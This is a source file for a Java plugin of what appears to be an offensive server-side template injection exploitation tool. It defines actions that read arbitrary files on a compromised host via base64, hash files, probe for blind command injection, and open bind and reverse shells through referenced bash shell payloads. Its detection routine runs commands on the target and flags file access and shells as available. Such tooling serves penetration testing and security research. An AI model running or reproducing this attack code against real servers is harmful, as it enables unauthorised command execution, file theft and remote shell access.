from core.plugin import Plugin
from core import languages
from utils import rand
import re

class Java(Plugin):

    def language_init(self):

        self.update_actions({
            'read' : {
                'call': 'execute',
                'read' : """base64<'%(path)s'"""
            },
            'md5' : {
                'call': 'execute',
                'md5': """$(type -p md5 md5sum)<'%(path)s'|head -c 32"""
            },
            # Prepared to used only for blind detection. Not useful for time-boolean
            # tests (since && characters can\'t be used) but enough for the detection phase.
            'blind' : {
                'call': 'execute_blind',
                'bool_true' : 'true',
                'bool_false' : 'false'
            },
            'bind_shell' : {
                'call' : 'execute_blind',
                'bind_shell': languages.bash_bind_shell
            },
            'reverse_shell' : {
                'call': 'execute_blind',
                'reverse_shell' : languages.bash_reverse_shell
            }
        })

    language = 'java'

    def rendered_detected(self):

        expected_rand = str(rand.randint_n(2))
        if expected_rand == self.execute('echo %s' % expected_rand):
            self.set('execute', True)
            self.set('write', True)
            self.set('read', True)
            self.set('bind_shell', True)
            self.set('reverse_shell', True)

            os = self.execute("""uname""")
            if os and re.search('^[\w-]+$', os):
                self.set('os', os)

    def blind_detected(self):

        # No blind code evaluation is possible here, only execution

        # Since execution has been used to detect blind injection,
        # let's assume execute_blind as set.
        self.set('execute_blind', True)
        self.set('write', True)
        self.set('bind_shell', True)
        self.set('reverse_shell', True)
